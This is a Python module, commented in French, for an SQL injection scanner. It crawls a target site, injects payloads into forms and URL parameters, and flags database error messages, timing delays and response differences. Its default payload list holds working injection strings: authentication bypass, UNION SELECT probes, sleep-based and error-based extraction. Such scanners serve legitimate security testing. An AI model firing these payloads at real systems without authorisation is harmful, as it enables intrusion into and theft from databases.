#!/usr/bin/env python3
"""
Module pour la détection de vulnérabilités d'injection SQL.
"""

import requests
import logging
import os
import re
import time
import concurrent.futures
from typing import List, Dict, Any, Set
from urllib.parse import urlparse, parse_qs, urljoin
from bs4 import BeautifulSoup

from config.settings import PAYLOADS_DIR, TIMEOUT, USER_AGENT

class SQLInjectionScanner:
    """Scanner pour détecter les vulnérabilités d'injection SQL."""
    
    def __init__(self, target_url: str, depth: int = 2):
        """
        Initialise le scanner d'injection SQL.
        
        Args:
            target_url: URL à scanner
            depth: Profondeur maximale d'exploration (par défaut: 2)
        """
        self.target_url = target_url
        self.depth = depth
        self.visited_urls: Set[str] = set()
        self.forms: List[Dict[str, Any]] = []
        self.parameters: List[Dict[str, Any]] = []
        self.payloads: List[str] = self._load_payloads()
        self.logger = logging.getLogger(__name__)
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
        })
        
        # Expressions régulières pour détecter les erreurs SQL
        self.error_patterns = [
            r"SQL syntax.*?MySQL",
            r"Warning.*?mysqli",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that corresponds to your (MySQL|MariaDB) server version",
            r"MySqlClient\.",
            r"com\.mysql\.jdbc\.exceptions",
            r"Uncaught Error: Call to a member function",
            r"ORA-[0-9][0-9][0-9][0-9]",
            r"Oracle error",
            r"Oracle.*?Driver",
            r"Warning.*?oci_.*?function",
            r"quoted string not properly terminated",
            r"SQL Server.*?Error",
            r"Microsoft SQL Native Client error",
            r"SQLSTATE\[",
            r"\[SQLSTATE\]",
            r"SQLite\/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"Syntax error or access violation",
            r"Uncaught exceptions\: SQLException",
            r"PostgreSQL.*?ERROR",
            r"Warning.*?pg_.*?function",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"PG::SyntaxError:",
            r"org\.postgresql\.util\.PSQLException"
        ]
    
    def _load_payloads(self) -> List[str]:
        """
        Charge les payloads d'injection SQL depuis le fichier.
        
        Returns:
            Liste des payloads
        """
        try:
            payload_file = os.path.join(PAYLOADS_DIR, 'sqli.txt')
            if os.path.exists(payload_file):
                with open(payload_file, 'r', encoding='utf-8') as f:
                    return [line.strip() for line in f if line.strip() and not line.startswith('#')]
            else:
                # Payloads par défaut si le fichier n'existe pas
                return [
                    "' OR 1=1 --",
                    "' OR '1'='1",
                    "' OR '1'='1' --",
                    "' OR 1=1#",
                    "\" OR 1=1 --",
                    "\" OR \"1\"=\"1",
                    "\" OR \"1\"=\"1\" --",
                    "' UNION SELECT NULL, NULL#",
                    "' UNION SELECT NULL, NULL, NULL#",
                    "' UNION SELECT NULL, NULL, NULL, NULL#",
                    "' UNION SELECT NULL, NULL, NULL, NULL, NULL#",
                    "admin' --",
                    "admin' #",
                    "' OR sleep(5) --",
                    "\" OR sleep(5) --",
                    "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --"
                ]
        except Exception as e:
            self.logger.error(f"Erreur lors du chargement des payloads SQL : {e}")
            return ["' OR 1=1 --"]  # Payload par défaut en cas d'erreur
    
    def scan(self) -> List[Dict[str, Any]]:
        """
        Effectue le scan d'injection SQL.
        
        Returns:
            Liste des vulnérabilités d'injection SQL détectées
        """
        self.logger.info(f"Démarrage du scan d'injection SQL sur {self.target_url}")
        
        try:
            # Exploration des pages
            self._crawl(self.target_url, self.depth)
            
            # Récupération des formulaires et des paramètres
            self.logger.info(f"Nombre de formulaires trouvés : {len(self.forms)}")
            self.logger.info(f"Nombre de paramètres URL trouvés : {len(self.parameters)}")
            
            # Test des vulnérabilités SQL injection
            vulnerabilities = []
            
            # Test des formulaires
            with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
                form_futures = [
                    executor.submit(self._test_form, form)
                    for form in self.forms
                ]
                
                for future in concurrent.futures.as_completed(form_futures):
                    result = future.result()
                    if result:
                        vulnerabilities.append(result)
            
            # Test des paramètres GET
            with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
                param_futures = [
                    executor.submit(self._test_parameter, param)
                    for param in self.parameters
                ]
                
                for future in concurrent.futures.as_completed(param_futures):
                    result = future.result()
                    if result:
                        vulnerabilities.append(result)
            
            self.logger.info(f"Scan d'injection SQL terminé. {len(vulnerabilities)} vulnérabilités trouvées.")
            return vulnerabilities
        
        except Exception as e:
            self.logger.error(f"Erreur lors du scan d'injection SQL : {e}")
            return [{"type": "error", "severity": "high", "description": f"Erreur lors du scan d'injection SQL : {str(e)}"}]
    
    def _crawl(self, url: str, depth: int) -> None:
        """
        Explore les pages pour trouver des formulaires et des paramètres GET.
        
        Args:
            url: URL à explorer
            depth: Profondeur d'exploration restante
        """
        if depth <= 0 or url in self.visited_urls:
            return
        
        self.visited_urls.add(url)
        
        try:
            response = self.session.get(url, timeout=TIMEOUT)
            if response.status_code != 200:
                return
            
            # Analyser les paramètres GET de l'URL
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            
            for param_name in query_params:
                self.parameters.append({
                    'url': url,
                    'param': param_name,
                    'value': query_params[param_name][0]
                })
            
            # Analyser le HTML
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Trouver les formulaires
            for form in soup.find_all('form'):
                form_info = {
                    'url': url,
                    'action': form.get('action', ''),
                    'method': form.get('method', 'get').lower(),
                    'inputs': []
                }
                
                # Si l'action est relative, la convertir en URL absolue
                if form_info['action'] and not form_info['action'].startswith(('http://', 'https://')):
                    form_info['action'] = urljoin(url, form_info['action'])
                elif not form_info['action']:
                    form_info['action'] = url
                
                # Trouver les champs de saisie
                for input_field in form.find_all(['input', 'textarea']):
                    field_type = input_field.get('type', '')
                    field_name = input_field.get('name', '')
                    
                    if field_name and field_type not in ['submit', 'button', 'image', 'reset', 'file', 'hidden']:
                        form_info['inputs'].append({
                            'name': field_name,
                            'type': field_type,
                            'value': input_field.get('value', '')
                        })
                
                if form_info['inputs']:
                    self.forms.append(form_info)
            
            # Explorer les liens si la profondeur le permet
            if depth > 1:
                for link in soup.find_all('a', href=True):
                    new_url = link['href']
                    
                    # Ignorer les liens vers des ancres ou des protocoles non-HTTP
                    if new_url.startswith('#') or new_url.startswith(('javascript:', 'mailto:', 'tel:')):
                        continue
                    
                    # Convertir les URLs relatives en absolues
                    if not new_url.startswith(('http://', 'https://')):
                        new_url = urljoin(url, new_url)
                    
                    # Ne suivre que les liens du même domaine
                    if urlparse(new_url).netloc == urlparse(url).netloc:
                        self._crawl(new_url, depth - 1)
        
        except Exception as e:
            self.logger.error(f"Erreur lors de l'exploration de {url} : {e}")
    
    def _test_form(self, form: Dict[str, Any]) -> Dict[str, Any]:
        """
        Teste un formulaire pour les vulnérabilités d'injection SQL.
        
        Args:
            form: Informations sur le formulaire
            
        Returns:
            Détails de la vulnérabilité si détectée, sinon None
        """
        self.logger.debug(f"Test du formulaire à {form['url']} (action: {form['action']})")
        
        # Obtenir une réponse normale pour comparaison
        normal_data = {}
        for input_field in form['inputs']:
            normal_data[input_field['name']] = input_field['value'] or "test"
        
        try:
            if form['method'] == 'post':
                normal_response = self.session.post(form['action'], data=normal_data, timeout=TIMEOUT, allow_redirects=True)
            else:
                normal_response = self.session.get(form['action'], params=normal_data, timeout=TIMEOUT, allow_redirects=True)
            
            normal_content_length = len(normal_response.text)
            normal_status_code = normal_response.status_code
        except Exception as e:
            self.logger.error(f"Erreur lors du test normal du formulaire : {e}")
            return None
        
        # Tester chaque champ du formulaire avec chaque payload
        for input_field in form['inputs']:
            for payload in self.payloads:
                data = normal_data.copy()
                data[input_field['name']] = payload
                
                try:
                    if form['method'] == 'post':
                        response = self.session.post(form['action'], data=data, timeout=TIMEOUT, allow_redirects=True)
                    else:
                        response = self.session.get(form['action'], params=data, timeout=TIMEOUT, allow_redirects=True)
                    
                    # Vérifier les erreurs SQL dans la réponse
                    for pattern in self.error_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            return {
                                "type": "sql_injection",
                                "severity": "high",
                                "url": form['url'],
                                "form_action": form['action'],
                                "form_method": form['method'],
                                "input_field": input_field['name'],
                                "payload": payload,
                                "pattern_matched": pattern,
                                "description": f"Vulnérabilité d'injection SQL trouvée dans le formulaire à {form['url']} (champ: {input_field['name']})"
                            }
                    
                    # Vérifier les différences significatives de taille de réponse
                    content_length_diff = abs(len(response.text) - normal_content_length)
                    if content_length_diff > 1000 and response.status_code == normal_status_code:
                        return {
                            "type": "sql_injection",
                            "severity": "medium",
                            "url": form['url'],
                            "form_action": form['action'],
                            "form_method": form['method'],
                            "input_field": input_field['name'],
                            "payload": payload,
                            "content_length_diff": content_length_diff,
                            "description": f"Possible vulnérabilité d'injection SQL trouvée dans le formulaire à {form['url']} (champ: {input_field['name']}) - différence de taille de réponse"
                        }
                    
                    # Vérifier les différences de code de statut
                    if response.status_code != normal_status_code:
                        return {
                            "type": "sql_injection",
                            "severity": "medium",
                            "url": form['url'],
                            "form_action": form['action'],
                            "form_method": form['method'],
                            "input_field": input_field['name'],
                            "payload": payload,
                            "status_code_diff": f"{normal_status_code} -> {response.status_code}",
                            "description": f"Possible vulnérabilité d'injection SQL trouvée dans le formulaire à {form['url']} (champ: {input_field['name']}) - différence de code de statut"
                        }
                    
                    # Tester les délais pour les injections temporisées
                    if "sleep" in payload.lower() or "benchmark" in payload.lower() or "pg_sleep" in payload.lower():
                        start_time = time.time()
                        if form['method'] == 'post':
                            self.session.post(form['action'], data=data, timeout=TIMEOUT+5, allow_redirects=True)
                        else:
                            self.session.get(form['action'], params=data, timeout=TIMEOUT+5, allow_redirects=True)
                        elapsed_time = time.time() - start_time
                        
                        if elapsed_time > 5:  # Si la réponse a pris plus de 5 secondes
                            return {
                                "type": "sql_injection",
                                "severity": "high",
                                "url": form['url'],
                                "form_action": form['action'],
                                "form_method": form['method'],
                                "input_field": input_field['name'],
                                "payload": payload,
                                "elapsed_time": elapsed_time,
                                "description": f"Vulnérabilité d'injection SQL temporisée trouvée dans le formulaire à {form['url']} (champ: {input_field['name']})"
                            }
                
                except requests.exceptions.Timeout:
                    # Si un timeout se produit avec un payload de type sleep, c'est un indicateur
                    if "sleep" in payload.lower() or "benchmark" in payload.lower() or "pg_sleep" in payload.lower():
                        return {
                            "type": "sql_injection",
                            "severity": "high",
                            "url": form['url'],
                            "form_action": form['action'],
                            "form_method": form['method'],
                            "input_field": input_field['name'],
                            "payload": payload,
                            "description": f"Vulnérabilité d'injection SQL temporisée trouvée dans le formulaire à {form['url']} (champ: {input_field['name']}) - timeout"
                        }
                except Exception as e:
                    self.logger.error(f"Erreur lors du test du formulaire avec le payload {payload} : {e}")
        
        return None
    
    def _test_parameter(self, param: Dict[str, Any]) -> Dict[str, Any]:
        """
        Teste un paramètre GET pour les vulnérabilités d'injection SQL.
        
        Args:
            param: Informations sur le paramètre
            
        Returns:
            Détails de la vulnérabilité si détectée, sinon None
        """
        self.logger.debug(f"Test du paramètre {param['param']} à {param['url']}")
        
        parsed_url = urlparse(param['url'])
        query_params = parse_qs(parsed_url.query)
        
        # Obtenir une réponse normale pour comparaison
        try:
            normal_response = self.session.get(param['url'], timeout=TIMEOUT, allow_redirects=True)
            normal_content_length = len(normal_response.text)
            normal_status_code = normal_response.status_code
        except Exception as e:
            self.logger.error(f"Erreur lors du test normal du paramètre : {e}")
            return None
        
        for payload in self.payloads:
            # Copier les paramètres existants et remplacer la valeur du paramètre testé
            test_params = query_params.copy()
            test_params[param['param']] = [payload]
            
            try:
                # Créer une nouvelle URL avec le payload
                test_url = parsed_url._replace(query='').geturl()
                
                response = self.session.get(test_url, params=test_params, timeout=TIMEOUT, allow_redirects=True)
                
                # Vérifier les erreurs SQL dans la réponse
                for pattern in self.error_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        return {
                            "type": "sql_injection",
                            "severity": "high",
                            "url": param['url'],
                            "parameter": param['param'],
                            "payload": payload,
                            "pattern_matched": pattern,
                            "description": f"Vulnérabilité d'injection SQL trouvée dans le paramètre {param['param']} à {param['url']}"
                        }
                
                # Vérifier les différences significatives de taille de réponse
                content_length_diff = abs(len(response.text) - normal_content_length)
                if content_length_diff > 1000 and response.status_code == normal_status_code:
                    return {
                        "type": "sql_injection",
                        "severity": "medium",
                        "url": param['url'],
                        "parameter": param['param'],
                        "payload": payload,
                        "content_length_diff": content_length_diff,
                        "description": f"Possible vulnérabilité d'injection SQL trouvée dans le paramètre {param['param']} à {param['url']} - différence de taille de réponse"
                    }
                
                # Vérifier les différences de code de statut
                if response.status_code != normal_status_code:
                    return {
                        "type": "sql_injection",
                        "severity": "medium",
                        "url": param['url'],
                        "parameter": param['param'],
                        "payload": payload,
                        "status_code_diff": f"{normal_status_code} -> {response.status_code}",
                        "description": f"Possible vulnérabilité d'injection SQL trouvée dans le paramètre {param['param']} à {param['url']} - différence de code de statut"
                    }
                
                # Tester les délais pour les injections temporisées
                if "sleep" in payload.lower() or "benchmark" in payload.lower() or "pg_sleep" in payload.lower():
                    start_time = time.time()
                    self.session.get(test_url, params=test_params, timeout=TIMEOUT+5, allow_redirects=True)
                    elapsed_time = time.time() - start_time
                    
                    if elapsed_time > 5:  # Si la réponse a pris plus de 5 secondes
                        return {
                            "type": "sql_injection",
                            "severity": "high",
                            "url": param['url'],
                            "parameter": param['param'],
                            "payload": payload,
                            "elapsed_time": elapsed_time,
                            "description": f"Vulnérabilité d'injection SQL temporisée trouvée dans le paramètre {param['param']} à {param['url']}"
                        }
            
            except requests.exceptions.Timeout:
                # Si un timeout se produit avec un payload de type sleep, c'est un indicateur
                if "sleep" in payload.lower() or "benchmark" in payload.lower() or "pg_sleep" in payload.lower():
                    return {
                        "type": "sql_injection",
                        "severity": "high",
                        "url": param['url'],
                        "parameter": param['param'],
                        "payload": payload,
                        "description": f"Vulnérabilité d'injection SQL temporisée trouvée dans le paramètre {param['param']} à {param['url']} - timeout"
                    }
            except Exception as e:
                self.logger.error(f"Erreur lors du test du paramètre avec le payload {payload} : {e}")
        
        return None

if __name__ == "__main__":
    # Test du module
    import sys
    
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
    
    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = "http://example.com"
    
    scanner = SQLInjectionScanner(target)
    vulnerabilities = scanner.scan()
    print(f"Vulnérabilités d'injection SQL trouvées: {len(vulnerabilities)}")
    for vuln in vulnerabilities:
        print(f"- {vuln['description']}")